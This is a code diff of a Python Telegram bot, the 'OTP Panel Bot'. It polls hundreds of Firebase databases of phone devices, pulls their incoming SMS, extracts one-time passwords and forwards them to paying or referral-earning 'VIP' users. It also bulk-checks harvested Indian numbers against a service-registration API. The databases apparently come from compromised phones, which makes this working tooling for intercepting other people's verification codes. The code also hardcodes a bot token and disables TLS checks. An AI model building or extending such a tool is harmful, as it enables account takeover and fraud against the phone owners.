@@ -2,7 +2,7 @@
 """
 ══════════════════════════════════════════════════════════════════
         OTP PANEL BOT — ULTIMATE EDITION (1000+ USERS)           
-  50x Pro Workers | Queue System | Zero Crash | Penalty | 24h VIP
+  Targeted SMS Fetching (0% Lag) | Railway Ready | Penalty Sys
 ══════════════════════════════════════════════════════════════════
 """
 
@@ -40,10 +40,10 @@ logging.getLogger("telegram").setLevel(logging.ERROR)
 # ══════════════════════════════════════════════════════════════════
 #  CONFIG - CREDENTIALS & API
 # ══════════════════════════════════════════════════════════════════
-POLL_INTERVAL   = 5
+POLL_INTERVAL   = 10  # Optimal speed for Railway
 SMS_LIMIT       = 25
 PAGE_SIZE       = 10  
-NUM_WORKERS     = 50  # 🔥 Superfast 50 Workers for 373 DBs
+NUM_WORKERS     = 20  # Reduced to save RAM, fast enough with targeted fetch
 TOKEN           = "8218848065:AAGEg8EbJ2ArHRKfN04QMvSvD09V-wXtugY"  
 BOT_USERNAME    = "freepanelssmsbot"
 DB_FILE         = "bot_database.json"
@@ -53,6 +53,9 @@ REQUIRED_CHANNELS = [
     {"username": "sabkijayhokhush", "url": "https://t.me/sabkijayhokhush", "name": "Sabki Jay Ho Khush"},
     {"username": "rosekhudkabanaya", "url": "https://t.me/rosekhudkabanaya", "name": "Rose Khud Ka Banaya"},
 ]
+
+# Advanced Worker Limiter (Prevents DNS Choke on Railway)
+SCAN_SEMAPHORE = asyncio.Semaphore(15)
 
 # ══════════════════════════════════════════════════════════════════
 #  SUPERASSETS CHECKER CONFIG & PANELS
@@ -75,7 +78,7 @@ DEFAULT_CHECKER_SETTINGS = {
     "unlocked_panels": ["DB_1", "DB_2", "DB_3"], 
     "maintenance": False,
     "check_anim": "⚡",
-    "stats": {"total_checks": 0, "today_checks": 0, "success": 0, "failed": 0},
+    "stats": {"total_checks": 0, "today_checks": 0, "success": 0, "failed": 0}
 }
 
 API_KEYS_STATE = {}
@@ -287,7 +290,7 @@ class Device:
 seen_ids:  set[str] = set()   
 first_run: bool     = True
 _main_app: Optional[Application] = None
-global_session: Optional[aiohttp.ClientSession] = None
+_http_session: Optional[aiohttp.ClientSession] = None
 
 all_users: dict[int, dict] = {}
 pending_action: dict[int, dict] = {}
@@ -301,9 +304,6 @@ CLONES: dict[str, dict] = {}
 GLOBAL_DEVICE_CACHE: dict[str, list] = {}
 SYS_SETTINGS: dict = DEFAULT_CHECKER_SETTINGS.copy()
 
-# ══════════════════════════════════════════════════════════════════
-#  QUEUE & WORKERS SYSTEM (MAX SPEED / NO CRASH)
-# ══════════════════════════════════════════════════════════════════
 db_queue = asyncio.Queue()
 
 # ══════════════════════════════════════════════════════════════════
@@ -315,10 +315,8 @@ def _sync_save_data():
         clones_to_save = {}
         for t, d in CLONES.items():
             clones_to_save[t] = {
-                "creator": d.get("creator"),
-                "expiry": d.get("expiry"),
-                "custom_db": d.get("custom_db"),
-                "users": d.get("users", {}),
+                "creator": d.get("creator"), "expiry": d.get("expiry"),
+                "custom_db": d.get("custom_db"), "users": d.get("users", {}),
                 "username": d.get("username", "")
             }
         data_to_dump = {"all_users": all_users, "CLONES": clones_to_save, "SYS_SETTINGS": SYS_SETTINGS}
@@ -337,10 +335,8 @@ def load_data():
                 for t, d in data.get("CLONES", {}).items():
                     d["users"] = {int(uk): uv for uk, uv in d.get("users", {}).items()}
                     CLONES[t] = d
-                if "SYS_SETTINGS" in data:
-                    SYS_SETTINGS.update(data["SYS_SETTINGS"])
+                if "SYS_SETTINGS" in data: SYS_SETTINGS.update(data["SYS_SETTINGS"])
         except: pass
-    
     if 6860106371 not in SYS_SETTINGS.setdefault("admins", [6860106371]):
         SYS_SETTINGS["admins"].append(6860106371)
 
@@ -455,15 +451,12 @@ def safe_ts(val) -> int:
 def get_status(status_val, ts_val) -> str:
     stat_str = str(status_val).strip().lower() if status_val is not None else ""
     is_explicitly_online = (stat_str == "online" or stat_str == "true")
-    
     ts = safe_ts(ts_val)
     is_recently_active = False
     if ts > 0:
-        if (time.time() - ts) < 43200: # 12 hours
-            is_recently_active = True
+        if (time.time() - ts) < 43200: is_recently_active = True
             
-    if is_explicitly_online or is_recently_active:
-        return "online"
+    if is_explicitly_online or is_recently_active: return "online"
     return "offline"
 
 def sms_date(sms: dict) -> str:
@@ -482,24 +475,32 @@ async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYP
     if re.search(r"-?\d{8,}", err_str): return 
     tlog(f"Telegram API Error: {context.error}")
 
-async def init_session():
-    global global_session
-    if global_session is None or global_session.closed:
+async def get_http_session() -> aiohttp.ClientSession:
+    global _http_session
+    if _http_session is None or _http_session.closed:
         ssl_context = ssl.create_default_context()
         ssl_context.check_hostname = False
         ssl_context.verify_mode = ssl.CERT_NONE
-        connector = TCPConnector(limit=300, limit_per_host=50, ttl_dns_cache=600, ssl=ssl_context, enable_cleanup_closed=True)
-        global_session = ClientSession(connector=connector, timeout=ClientTimeout(total=8), trust_env=True, headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Connection": "keep-alive"})
+        connector = TCPConnector(limit=150, limit_per_host=30, ttl_dns_cache=600, ssl=ssl_context, enable_cleanup_closed=True)
+        timeout = ClientTimeout(total=10, connect=5, sock_read=8)
+        _http_session = ClientSession(connector=connector, timeout=timeout, trust_env=True, headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Connection": "keep-alive"})
+    return _http_session
 
 async def fb_get(path: str, base: str) -> Optional[dict]:
     try:
+        session = await get_http_session()
         url = f"{base}/{path}.json" if path else f"{base}/.json"
-        async with global_session.get(url) as response:
-            if response.status == 200:
-                data = await response.json(content_type=None)
-                return data if isinstance(data, dict) else None
-    except Exception: pass
-    return None
+        for _ in range(2):
+            try:
+                async with session.get(url) as response:
+                    if response.status == 200:
+                        data = await response.json(content_type=None)
+                        return data if isinstance(data, dict) else None
+                    elif response.status in [404, 403]: return None
+                    else: await asyncio.sleep(0.5); continue
+            except: await asyncio.sleep(0.5); continue
+        return None
+    except: return None
 
 # ══════════════════════════════════════════════════════════════════
 #  LIMIT SYSTEM & PENALTY TRACKING
@@ -597,7 +598,8 @@ async def check_number_api(service: str, number: str) -> dict:
     payload = {"service": service.lower(), "number": clean_number}
     start_req = time.time()
     try:
-        async with global_session.post("https://superassets.in/api/v1/check", json=payload, headers={"X-API-Key": selected_key, "Content-Type": "application/json"}) as r:
+        session = await get_http_session()
+        async with session.post("https://superassets.in/api/v1/check", json=payload, headers={"X-API-Key": selected_key, "Content-Type": "application/json"}, timeout=ClientTimeout(total=8)) as r:
             req_ms = int((time.time() - start_req) * 1000)
             if r.status == 200: 
                 res = await r.json()
@@ -607,7 +609,7 @@ async def check_number_api(service: str, number: str) -> dict:
     except Exception: return {"status": "error", "message": f"Timeout", "ms": int((time.time() - start_req) * 1000)}
 
 # ══════════════════════════════════════════════════════════════════
-#  FIREBASE DATA FETCHER - QUEUE WORKERS
+#  FIREBASE DATA FETCHER - TARGETED SMS MODE
 # ══════════════════════════════════════════════════════════════════
 
 async def _forward_sms(device: Device, sms: dict) -> None:
@@ -696,48 +698,41 @@ async def fetch_and_process_db(tag: str, url: str, is_first_run: bool):
         GLOBAL_DEVICE_CACHE[tag] = devices_list
 
         if not is_first_run:
-            # Check SMS only for online devices to save memory & requests
-            online_devs = [d for d in devices_list if d.status == "online"]
-            if not online_devs: return
+            # 🔥 RAM OPTIMIZATION: Only fetch SMS for devices that users are currently looking at!
+            focused_dev_ids = set()
+            for bot_tok, chat_dict in user_focus.items():
+                focused_dev_ids.update(chat_dict.values())
+                
+            active_focus_devs = [d for d in devices_list if d.id in focused_dev_ids]
             
-            r_main, r_user, r_root = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url), return_exceptions=True)
-            device_map = {d.id: d for d in online_devs}
-            
-            for bulk_data in (r_main, r_user, r_root):
-                if not isinstance(bulk_data, dict): continue
-                for dev_id, sms_dict in bulk_data.items():
-                    if not isinstance(sms_dict, dict) or not device_map.get(dev_id): continue
+            for d in active_focus_devs:
+                sms_dict = await fb_get(d.sms_path, d.base_url)
+                if isinstance(sms_dict, dict):
                     for k, sms in sms_dict.items():
                         if not isinstance(sms, dict): continue
-                        sk = seen_key(dev_id, k)
+                        sk = seen_key(d.id, k)
                         if sk in seen_ids: continue
                         seen_ids.add(sk)
-                        try: await _forward_sms(device_map.get(dev_id), sms)
+                        try: await _forward_sms(d, sms)
                         except: pass
-                                
-    except: pass
+                            
+    except Exception: pass
 
 async def db_worker():
     while True:
         tag, url, is_first_run = await db_queue.get()
-        try:
-            await fetch_and_process_db(tag, url, is_first_run)
+        try: await fetch_and_process_db(tag, url, is_first_run)
         except Exception: pass
-        finally:
-            db_queue.task_done()
+        finally: db_queue.task_done()
 
 async def poll_loop(app: Application) -> None:
     global first_run, _main_app
     _main_app = app
     
-    # Start 50 Workers for maximum speed
-    for _ in range(NUM_WORKERS):
-        asyncio.create_task(db_worker())
+    for _ in range(NUM_WORKERS): asyncio.create_task(db_worker())
     
     while True:
-        for tag, url in DATABASES.items():
-            await db_queue.put((tag, url, first_run))
-        
+        for tag, url in DATABASES.items(): await db_queue.put((tag, url, first_run))
         await db_queue.join()
         
         if first_run:
@@ -960,7 +955,11 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             try: await ctx.bot.send_message(ref_id, f"🎉 <b>SUCCESSFUL REFERRAL!</b>\n\nEk naye user ne aapke link se join kiya hai.\nCollect 15 referrals to get 1 Hour UNLIMITED VIP Access!\nYour Available Referrals: {avail}/15\n\n<i>⚠️ Note: Agar is user ne 24 ghante se pehle channel left kiya, toh dono ko penalty lagegi.</i>", parse_mode="HTML")
             except: pass
 
-    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)
+    if is_main_bot and not users_db.get(chat_id, {}).get("bonus_10_received"):
+        users_db.setdefault(chat_id, {})["bonus_10_received"] = True
+        users_db[chat_id]["coins"] = users_db[chat_id].get("coins", 0) + 10
+        try: await ctx.bot.send_message(chat_id, "🎉 <b>GIFT FROM ADMIN</b> 🎉\n\nAdmin ne aapko <b>10 Coins free</b> diye hain! 🎁\n\nAb sirf doston ko invite karo aur 1 Hour VIP ya khudka bot banao!\n\nClick '💸 Refer & Earn' to get your link.", parse_mode="HTML")
+        except: pass
 
     unjoined = await check_membership(bot_token, ctx.bot, chat_id)
     if unjoined: return await send_join_prompt(update, is_main_bot)
@@ -1075,10 +1074,8 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 devices = [d for r in results if isinstance(r, tuple) for d in r[1]]
             else:
                 await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Scanning databases for fresh numbers...</i>", parse_mode="HTML")
-                
                 unlocked = SYS_SETTINGS.get("unlocked_panels", [])
                 all_devs = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, []) if is_admin or tag in unlocked or not tag.startswith("DB_")]
-                
                 unique_devices, seen_n = [], set()
                 for d in all_devs:
                     if d.numbers:
@@ -1094,7 +1091,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 return await safe_edit(query, "❌ No active online numbers found right now.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
             
             random.shuffle(fresh_devices)
-            
             seen_set = user_seen_unreg.setdefault(chat_id, set())
             if len(seen_set) > 50: seen_set.clear()
             
@@ -1106,7 +1102,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 if target_num in seen_set: continue
                     
                 await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 Auto-Scanning... [{idx}/{total_scan}]\n📱 Checking: <code>+91{target_num[-10:]}</code>\n⚡ <i>Hitting {service.upper()} API...</i>", parse_mode="HTML")
-                
                 res = await check_number_api(service, target_num)
                 is_error = res.get("status") == "error"
                 if is_error: await asyncio.sleep(1.0); continue
@@ -1330,7 +1325,6 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     if users_db.get(chat_id, {}).get("banned") or is_spamming(chat_id): return
     await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)
 
-    # 🔥 OWNER MANAGEMENT COMMANDS
     if is_root_admin(chat_id) and text.startswith("/addowner "):
         try:
             new_id = int(text.split()[1])
@@ -1626,10 +1620,34 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         return await wait_msg.edit_text(f"📢 BROADCAST COMPLETE", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_refresh")]]))
 
 # ══════════════════════════════════════════════════════════════════
-#  QUEUE & WORKERS SYSTEM (MAX SPEED)
+#  FIREBASE POLL — ZERO RAM USAGE
 # ══════════════════════════════════════════════════════════════════
 
-db_queue = asyncio.Queue()
+async def _forward_sms(device: Device, sms: dict) -> None:
+    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
+    if not body: return
+
+    label = device_label(device)
+    otp = extract_otp(body)
+    msg_text = auto_forward_msg(sms, label)
+    
+    kb_rows = []
+    if otp: kb_rows.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
+    kb_rows.append([InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{device.id}"), InlineKeyboardButton("ℹ️ Device Info", callback_data=f"info:{device.id}")])
+    markup = InlineKeyboardMarkup(kb_rows)
+    send_tasks = []
+
+    for bot_token, chat_dict in user_focus.items():
+        if bot_token != TOKEN:
+            if bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]: continue
+            app_to_use, users_db = CLONES[bot_token]["app"], CLONES[bot_token]["users"]
+        else: app_to_use, users_db = _main_app, all_users
+
+        for chat_id in [cid for cid, did in chat_dict.items() if did == device.id and is_vip(bot_token, cid)]:
+            if otp: users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
+            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode="HTML"))
+            
+    if send_tasks: await asyncio.gather(*send_tasks, return_exceptions=True)
 
 async def fetch_and_process_db(tag: str, url: str, is_first_run: bool):
     try:
@@ -1691,73 +1709,40 @@ async def fetch_and_process_db(tag: str, url: str, is_first_run: bool):
         GLOBAL_DEVICE_CACHE[tag] = devices_list
 
         if not is_first_run:
-            online_devs = [d for d in devices_list if d.status == "online"]
-            if not online_devs: return
+            # 🔥 RAM OPTIMIZATION: Sirf unhi numbers ka SMS fetch hoga jo users view kar rahe hain!
+            focused_dev_ids = set()
+            for bot_tok, chat_dict in user_focus.items():
+                focused_dev_ids.update(chat_dict.values())
+                
+            active_focus_devs = [d for d in devices_list if d.id in focused_dev_ids]
             
-            r_main, r_user, r_root = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url), return_exceptions=True)
-            device_map = {d.id: d for d in online_devs}
-            
-            for bulk_data in (r_main, r_user, r_root):
-                if not isinstance(bulk_data, dict): continue
-                for dev_id, sms_dict in bulk_data.items():
-                    if not isinstance(sms_dict, dict) or not device_map.get(dev_id): continue
+            for d in active_focus_devs:
+                sms_dict = await fb_get(d.sms_path, d.base_url)
+                if isinstance(sms_dict, dict):
                     for k, sms in sms_dict.items():
                         if not isinstance(sms, dict): continue
-                        sk = seen_key(dev_id, k)
+                        sk = seen_key(d.id, k)
                         if sk in seen_ids: continue
                         seen_ids.add(sk)
-                        try: await _forward_sms(device_map.get(dev_id), sms)
+                        try: await _forward_sms(d, sms)
                         except: pass
-                                
-    except: pass
-
-async def _forward_sms(device: Device, sms: dict) -> None:
-    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
-    if not body: return
-
-    label = device_label(device)
-    otp = extract_otp(body)
-    msg_text = auto_forward_msg(sms, label)
-    
-    kb_rows = []
-    if otp: kb_rows.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
-    kb_rows.append([InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{device.id}"), InlineKeyboardButton("ℹ️ Device Info", callback_data=f"info:{device.id}")])
-    markup = InlineKeyboardMarkup(kb_rows)
-    send_tasks = []
-
-    for bot_token, chat_dict in user_focus.items():
-        if bot_token != TOKEN:
-            if bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]: continue
-            app_to_use, users_db = CLONES[bot_token]["app"], CLONES[bot_token]["users"]
-        else: app_to_use, users_db = _main_app, all_users
-
-        for chat_id in [cid for cid, did in chat_dict.items() if did == device.id and is_vip(bot_token, cid)]:
-            if otp: users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
-            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode="HTML"))
-            
-    if send_tasks: await asyncio.gather(*send_tasks, return_exceptions=True)
-
-async def db_worker():
-    while True:
-        tag, url, is_first_run = await db_queue.get()
-        try:
-            await fetch_and_process_db(tag, url, is_first_run)
-        except Exception: pass
-        finally:
-            db_queue.task_done()
+                            
+    except Exception: pass
 
 async def poll_loop(app: Application) -> None:
     global first_run, _main_app
     _main_app = app
     
-    for _ in range(NUM_WORKERS):
-        asyncio.create_task(db_worker())
-    
     while True:
-        for tag, url in DATABASES.items():
-            await db_queue.put((tag, url, first_run))
+        # 🔥 Only 20 parallel workers fetching devices (Saves Memory & CPU on Railway)
+        sem = asyncio.Semaphore(NUM_WORKERS)
         
-        await db_queue.join()
+        async def sem_fetch(tag, url, fr):
+            async with sem:
+                await fetch_and_process_db(tag, url, fr)
+
+        tasks = [sem_fetch(tag, url, first_run) for tag, url in DATABASES.items()]
+        await asyncio.gather(*tasks, return_exceptions=True)
         
         if first_run:
             first_run = False
@@ -1774,7 +1759,7 @@ async def poll_loop(app: Application) -> None:
 def main() -> None:
     print("═" * 60)
     print("  🤖 OTP PANEL BOT — VIP EDITION (1000+ USERS)")
-    print("  🚀 50x Workers | Strict Freshness Filter | Railway Ready")
+    print("  🚀 Targeted SMS Fetching | Penalty | Railway Ready")
     print(f"  📱 {len(DATABASES)} Databases Loaded Successfully")
     print("═" * 60)
 
